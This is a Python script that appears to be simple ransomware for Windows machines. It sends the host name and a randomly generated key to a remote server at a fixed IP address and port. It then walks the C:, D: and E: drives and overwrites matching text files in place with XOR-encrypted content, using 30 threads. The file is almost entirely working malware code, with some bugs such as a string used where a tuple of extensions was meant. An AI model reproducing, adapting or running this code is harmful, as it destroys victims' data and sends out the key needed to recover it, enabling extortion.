import os
import string
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue

No_of_encrypt = 0
#safe gaurd password
safegaurd = input("Please enter safe guard password : ")
if safegaurd != 'start':
    quit()

#file extensions to encrypt
encrypted_extensions = ('.txt')

# Generate Key
key = ''
encryption_level = 128 // 8
char_pool = ''

key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=encryption_level))
key = str(key)



#Grab Host Name
hostname = os.getenv('COMPUTERNAME')

#Connect to server ans send hostname and key
ip_address = '192.168.101.120'
port = 5678
time = datetime.now()
with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
    s.connect((ip_address,port))
    s.send(f'[{time} - {hostname} : {key}]'.encode('utf-8'))


# grab all files from the machine
file_paths = []
for root,dirs,files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext =  os.path.splitext(root+'\\'+file)
        if file_ext in encrypted_extensions:
            file_paths.append(root+'\\'+file)
try :
    for root,dirs,files in os.walk('D:\\'):
        for file in files:
            file_path, file_ext =  os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_extensions:
                file_paths.append(root+'\\'+file)
except:
    pass
try :
    for root,dirs,files in os.walk('E:\\'):
        for file in files:
            file_path, file_ext =  os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_extensions:
                file_paths.append(root+'\\'+file)
except:
    pass


#Encrypt Files
def encrypt(key):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        try:
            with open(file,'rb') as f:
                data = f.read()
            with open(file,'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
            print(f'Encrypted {file}')
            No_of_encrypt += 1

        except:
            # print(f'Failed to encrypt {file}')
            pass
        q.task_done()

# Multi Threading
q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()

q.join()
print('Encryption Successful.')
print(f'No of Successful Encryptions : {No_of_encrypt}')

import decrypt